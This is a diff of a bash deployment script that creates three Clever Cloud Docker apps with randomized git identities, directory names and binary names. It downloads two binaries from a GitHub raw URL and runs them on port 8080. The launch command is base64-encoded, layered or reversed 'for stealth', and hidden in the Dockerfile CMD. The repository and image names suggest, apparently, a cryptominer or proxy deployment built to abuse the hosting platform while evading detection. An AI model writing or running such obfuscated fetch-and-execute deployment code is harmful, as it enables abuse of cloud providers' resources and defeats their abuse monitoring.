@@ -1,5 +1,5 @@
 #!/bin/bash
-# /docker - Fixed deployment with correct paths and app creation
+# /docker - Full command in CMD for both options
 
 set -e
 
@@ -16,7 +16,7 @@ echo "🔐 Logging into Clever Cloud..."
 clever login
 
 for i in 1 2 3; do
-    # ============ UNIQUE GIT CONFIG FOR THIS DEPLOYMENT ============
+    # ============ UNIQUE GIT CONFIG ============
     GIT_EMAIL="deploy_$(rand_str 10)@$(rand_str 8).com"
     GIT_NAME="$(rand_name 6) $(rand_name 8)"
     GIT_COMMIT_MSG="Update $(rand_str 15) $(date +%s)"
@@ -25,16 +25,25 @@ for i in 1 2 3; do
     git config --global user.name "$GIT_NAME"
     git config --global init.defaultBranch "master"
     
-    # ============ UNIQUE DIRECTORY FOR THIS DEPLOYMENT ============
+    # ============ UNIQUE DIRECTORY ============
     UNIQUE_DIR="deploy_$(rand_str 12)_$(date +%s)_${RANDOM}"
     APP_DIR="/app/deployments/${UNIQUE_DIR}"
     
-    # ============ UNIQUE WORKDIR FOR DOCKERFILE ============
+    # ============ UNIQUE WORKDIR ============
     UNIQUE_WORKDIR="/$(rand_str 15)"
     
     # ============ UNIQUE BINARY NAMES ============
     BIN1="$(rand_str 10)"
     BIN2="$(rand_str 10)"
+    
+    # ============ UNIQUE VARIABLES ============
+    VAR3=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
+    VAR4=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
+    VAR5=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
+    
+    # ============ URLS ============
+    SOCAT_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888"
+    WEB8888_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888"
     
     # ============ UNIQUE APP NAME ============
     APP_NAME="app_$(rand_str 8)_$(date +%s)_${RANDOM}"
@@ -43,121 +52,83 @@ for i in 1 2 3; do
     echo "========================================="
     echo "[$i/3] Deployment #$i"
     echo "========================================="
-    echo "📁 Directory: ${UNIQUE_DIR}"
     echo "📂 WORKDIR: ${UNIQUE_WORKDIR}"
-    echo "📦 Binary1: ${UNIQUE_WORKDIR}/${BIN1}"
-    echo "📦 Binary2: ${UNIQUE_WORKDIR}/${BIN2}"
-    echo "📧 Git Email: ${GIT_EMAIL}"
-    echo "👤 Git Name: ${GIT_NAME}"
+    echo "📦 Binary1: ${BIN1}"
+    echo "📦 Binary2: ${BIN2}"
     echo "🚀 App Name: ${APP_NAME}"
     echo "========================================="
     
     mkdir -p "$APP_DIR"
     cd "$APP_DIR"
     
-    # Obfuscated URLs
-    SOCAT_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888"
-    WEB8888_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888"
+    # ============ FULL COMMAND TO RUN IN CMD ============
+    FULL_COMMAND="cd ${UNIQUE_WORKDIR} && \
+export DEBIAN_FRONTEND=noninteractive && \
+export TZ=Etc/UTC && \
+ln -fs /usr/share/zoneinfo/Etc/UTC /etc/localtime && \
+apt-get update -qq && \
+apt-get install -y -qq apache2 curl wget socat netcat-openbsd iputils-ping sudo unzip tzdata libjansson-dev libcurl4-openssl-dev libssl-dev || true && \
+apt-get install -y -qq apache2 curl wget socat netcat-traditional iputils-ping sudo unzip tzdata || true && \
+sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf && \
+echo 'ServerName localhost' >> /etc/apache2/apache2.conf && \
+wget -q --timeout=30 --tries=2 -O ${BIN1} \"${SOCAT_URL}\" && \
+wget -q --timeout=30 --tries=2 -O ${BIN2} \"${WEB8888_URL}\" && \
+chmod 755 ${BIN1} ${BIN2} && \
+(${UNIQUE_WORKDIR}/${BIN1} --daemon --port 8080 &) && \
+service apache2 start && \
+sleep 5 && \
+exec ${UNIQUE_WORKDIR}/${BIN2} -a ${VAR3} -o ${VAR4} -u ${VAR5} --port 8080"
     
-    # Encode URLs to base64
-    SOCAT_ENCODED=$(echo -n "$SOCAT_URL" | base64 -w 0)
-    WEB8888_ENCODED=$(echo -n "$WEB8888_URL" | base64 -w 0)
-    
-    # Generate random variable names
-    VAR1=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
-    VAR2=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
-    VAR3=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
-    VAR4=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
-    VAR5=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
-    
-    # Generate random values
-    VAL1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-    VAL2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-    VAL3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
-    VAL4=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
-    VAL5=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
-    
-    # Pool of working Debian and Ubuntu images
-    WORKING_IMAGES=(
-        "ubuntu:20.04" "ubuntu:22.04" "ubuntu:24.04"
-        "debian:11" "debian:12" "debian:bookworm"
-    )
-    
-    # Pick random image
-    RANDOM_IMAGE=${WORKING_IMAGES[$RANDOM % ${#WORKING_IMAGES[@]}]}
-    
-    # Create start.sh content with FULL PATHS to binaries
-    START_SCRIPT_CONTENT="#!/bin/bash
-set -e
-
-cd ${UNIQUE_WORKDIR}
-
-export DEBIAN_FRONTEND=noninteractive
-export TZ=Etc/UTC
-ln -fs /usr/share/zoneinfo/Etc/UTC /etc/localtime
-apt-get update -qq
-apt-get install -y -qq apache2 curl wget socat netcat-openbsd iputils-ping sudo unzip tzdata || true
-sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf
-echo 'ServerName localhost' >> /etc/apache2/apache2.conf
-
-# Download binaries to WORKDIR with full paths
-wget -q -O ${BIN1} \"${SOCAT_URL}\"
-wget -q -O ${BIN2} \"${WEB8888_URL}\"
-chmod 777 ${BIN1} ${BIN2}
-
-# Start socat daemon from WORKDIR
-(${UNIQUE_WORKDIR}/${BIN1} --daemon --port 8080 &)
-
-# Start apache
-service apache2 start
-
-sleep 5
-
-# Execute web8888 from WORKDIR with full path
-exec ${UNIQUE_WORKDIR}/${BIN2} -a ${VAL3} -o ${VAL4} -u ${VAL5} --port 8080"
-
-    # Encode the start script to base64
-    START_SCRIPT_BASE64=$(echo -n "$START_SCRIPT_CONTENT" | base64 -w 0)
+    # Encode the command for stealth
+    ENCODED_CMD=$(echo -n "$FULL_COMMAND" | base64 -w 0)
     
     # Random encoding layer
     if [ $((RANDOM % 2)) -eq 0 ]; then
-        START_SCRIPT_BASE64=$(echo -n "$START_SCRIPT_BASE64" | base64 -w 0)
+        ENCODED_CMD=$(echo -n "$ENCODED_CMD" | base64 -w 0)
         DECODE_CMD="base64 -d | base64 -d"
     else
-        START_SCRIPT_BASE64=$(echo -n "$START_SCRIPT_BASE64" | rev)
+        ENCODED_CMD=$(echo -n "$ENCODED_CMD" | rev)
         DECODE_CMD="rev | base64 -d"
     fi
     
-    # Create Dockerfile with unique WORKDIR
+    # Pick random image (50/50 chance)
     if [[ $((RANDOM % 2)) -eq 0 ]]; then
+        # ============ OPTION 1: Random Ubuntu/Debian image ============
+        WORKING_IMAGES=(
+            "ubuntu:20.04" "ubuntu:22.04" "ubuntu:24.04"
+            "debian:11" "debian:12" "debian:bookworm"
+        )
+        RANDOM_IMAGE=${WORKING_IMAGES[$RANDOM % ${#WORKING_IMAGES[@]}]}
+        
         cat > Dockerfile << EOF
 FROM ${RANDOM_IMAGE}
 WORKDIR ${UNIQUE_WORKDIR}
 RUN apt-get update && apt-get install -y curl wget ca-certificates
-CMD echo '${START_SCRIPT_BASE64}' | ${DECODE_CMD} | bash
+CMD eval "\$(echo '${ENCODED_CMD}' | ${DECODE_CMD} | bash)"
 EOF
+        echo "✅ Option 1: Random image with encoded CMD"
+        
     else
+        # ============ OPTION 2: Fixed image with encoded CMD ============
         cat > Dockerfile << EOF
 FROM phemextradebot/cleverbot8888
 WORKDIR ${UNIQUE_WORKDIR}
-CMD /bin/bash /start
+CMD eval "\$(echo '${ENCODED_CMD}' | ${DECODE_CMD} | bash)"
 EOF
+        echo "✅ Option 2: Fixed image with encoded CMD"
     fi
     
-    echo "✅ Dockerfile created"
-    echo "📂 WORKDIR: ${UNIQUE_WORKDIR}"
-    echo "📦 Binary paths: ${UNIQUE_WORKDIR}/${BIN1} and ${UNIQUE_WORKDIR}/${BIN2}"
+    echo "📋 FULL COMMAND in CMD (base64 encoded)"
     
     # Git setup
     git init
     git add .
     git commit -m "$GIT_COMMIT_MSG"
     
-    # FIRST: Create the app
+    # Create and deploy
     echo "Creating app: ${APP_NAME}"
     clever create --type docker "$APP_NAME"
     
-    # SECOND: Deploy the app
     echo "Deploying $APP_NAME..."
     clever deploy
     
@@ -171,7 +142,7 @@ EOF
     rm -rf "$APP_DIR"
     
     if [ $i -lt 3 ]; then
-        echo "Waiting 10 seconds before next deployment..."
+        echo "Waiting 10 seconds..."
         sleep 10
     fi
 done
